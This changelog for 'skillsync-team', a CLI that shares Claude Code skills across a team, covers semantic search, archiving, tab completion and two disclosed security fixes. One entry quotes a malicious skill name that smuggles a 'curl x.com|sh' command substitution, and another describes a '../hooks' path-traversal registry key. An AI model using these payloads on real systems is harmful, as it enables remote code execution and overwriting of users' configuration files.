# Changelog

All notable changes to `skillsync-team`.

## [3.1.0] — 2026-05-17

> **Discoverability.**

### New: `skillsync search`

Find the skill you forgot you had. Two modes:

```bash
skillsync search                          # interactive search bar (type-as-you-go)
skillsync search "rate limiting on APIs"  # batch mode, top 8 by relevance
```

- **True semantic search** — "scraper" matches "data extraction", "rate limiting" matches "throttling". Powered by `Xenova/all-MiniLM-L6-v2` (384-dim sentence embeddings).
- **Runs offline** — local ONNX model via `@huggingface/transformers`. No API key, no network at search time.
- **Hybrid scoring** — exact substring matches return in ~30ms (lexical pre-filter). Fuzzy queries fall through to semantic in ~150ms (with model cached).
- **Embeddings ride along in `registry.json`** — computed at push time, shared with the team. New `descriptionEmbedding` field per skill (384 floats).
- **Lazy migration** — skills pushed before 3.1 have no embedding. First `skillsync search` generates them on-the-fly and persists them.
- **Quality**: 8/10 on typical short-description queries. STSb benchmark ~83 spearman.

### Why it matters

Your team's shared repo grows. You forget which teammate pushed the helpful caching skill, or whether anyone has built a Stripe utility yet. `skillsync search` makes that searchable by meaning, not just by remembering names.

### Trade-offs

- First-ever invocation downloads the ~25MB model from HuggingFace CDN (~10s on broadband). Cached locally after.
- Adds `@huggingface/transformers` and ONNX runtime to the install (~15MB).
- `package.json` description and `files` array updated.

### Upgrade

```bash
skillsync update
# or
npm install -g skillsync-team@latest
```

No data migration needed — existing registries work, new embeddings generate on first search.

---

## [3.0.0] — 2026-05-13

> **Lifecycle, security, and ergonomics.**

### New: archive & restore

The headline feature. Every team's skills directory eventually gets cluttered. You don't want to delete a skill — you might need it again — but you don't want it polluting Claude's context either.

```bash
skillsync archive          # picker → drop from shared repo + deactivate locally + preserve in archive
skillsync unarchive        # picker → bring it back when you need it
skillsync archived         # see what's in your archive
```

- Drops the skill from the shared repo + `registry.json`
- Moves your local copy out of `~/.claude/skills/` into `~/.skillsync/archive/` (Claude Code stops loading it)
- Preserves files with metadata (`archivedAt`, `archivedBy`, `lastVersion`, `reason`, `wasShared`)
- Restoration is one command — files move back to the active skills dir, metadata is cleaned out
- `--all`, `--reason "<msg>"`, `-m "<commit>"`, batched commits per run

### New: tab completion (bash / zsh / fish)

```bash
echo 'eval "$(skillsync completion zsh)"' >> ~/.zshrc
```

Then `<TAB>` after `skillsync push`, `archive`, `unarchive`, `remove`, `diff`, or `pull -s` autocompletes to live skill names. Names come from your filesystem + registry, so they stay in sync as you push/pull/archive.

40ms latency per completion. Safe-by-default — completion output is filtered to shell-safe names only.

### New: `skillsync diff <skill>`

See exactly what would change before you push or pull. Side-by-side git diff between your local skill and the shared repo version. `--pull` flips direction.

### Quality of life

- **Pickers now default unchecked.** Push and pull no longer pre-select anything. You actively pick what to act on. Safer; one less accidental push.
- **Recency-sorted pickers.** Skills sort by filesystem birth time (with mtime fallback), newest first. The ones you just edited float to the top — no more hunting alphabetically.
- **Validation on push.** Refuses skills with malformed YAML frontmatter, empty `description:`, or no `SKILL.md`. Warnings for soft issues (frontmatter `name:` doesn't match dir, invalid semver). One bad push can't break everyone's pull.
- **Outdated-version banner.** Every command (except `update` itself) prints a one-line nudge when a newer SkillSync is on npm. Cached 24h.
- **"Archived" section** in `skillsync list` so your archive stays discoverable.

### Security

Two RCE-class vulnerabilities found and fixed during a pre-release audit. Both were supply-chain attacks via the shared skills repo. Disclosed for transparency.

- **bash tab-completion command-substitution (high).** `compgen -W` expands `$(...)` in candidate strings. A malicious skill named `evil$(curl x.com|sh)` would execute on TAB. **Fixed**: `__complete` output is filtered to `[a-zA-Z0-9_][a-zA-Z0-9_.-]*`, and the bash completion script switched to a `read`-based loop that never re-evaluates candidates.
- **Path traversal via registry keys (high).** A crafted `registry.json` key like `"../hooks"` could overwrite arbitrary files under `~/.claude/` on pull (e.g., `~/.claude/hooks/skillsync-auto-pull.sh`, `~/.claude/settings.json`). **Fixed**: 4-layer validation — helper boundary (`copySkillToRepo`/`copySkillFromRepo`/`backupSkill`), registry iteration filter (skip + warn on bad keys), entry-point checks in push/remove/diff, completion output filter.

`npm audit`: 0 vulnerabilities. No `eval`, no `shell: true`, all subprocess args hardcoded.

### Breaking changes

- **Picker default is now unchecked.** If you relied on hitting enter to push everything, use `skillsync push --all` instead.
- **Tab completion only shows shell-safe names** (`[a-zA-Z0-9_.-]+`). Skills with `$`, backticks, spaces, etc. still work if typed manually but won't autocomplete. Consider renaming for consistency.

### Upgrade

```bash
skillsync update
# or
npm install -g skillsync-team@latest
```

No data migration needed. Skills, registry, config, and auto-sync hook all carry forward.

---

## [2.1.3] — 2026-05-09

- Push picker now defaults all candidates **unchecked** (was pre-selecting changed skills, which made hitting enter accidentally push everything).

## [2.1.2] — 2026-05-09

- Push picker now hides skills that are already in sync — only shows new + locally-changed.
- Cleaner "Nothing to push" message when there's nothing pushable.

## [2.1.1] — 2026-05-09

- README clarifications around the picker UX and conflict handling.

## [2.1.0] — 2026-05-09

- **`skillsync update`** — self-update command. Checks npm for the latest version and runs the install for you. `--check` to just check.

## [2.0.0] — 2026-05-09

- **Interactive picker for `skillsync push`** — run with no arguments and get a checkbox list of pushable skills. Space to toggle, enter to push them all in a batched commit.
- **Interactive picker for `skillsync pull`** — same UX in reverse for incoming skills.
- **Auto version bump on push** — when content changed but `version:` didn't, SkillSync bumps the frontmatter (default patch) and refreshes `date:`. No more registries full of `v0.0.0`.
- `--all` flag on push and pull for non-interactive use.
- `--bump <patch|minor|major|none>` to control the auto-bump level.
- **Security**: upgraded `simple-git` past two critical RCE CVEs (advisory GHSA-r275-fr43-pm7q, GHSA-hffm-xvc3-vprc).

## [1.x]

Initial public release. Push/pull/list/status/team/link/unlink/remove + auto-sync hook.
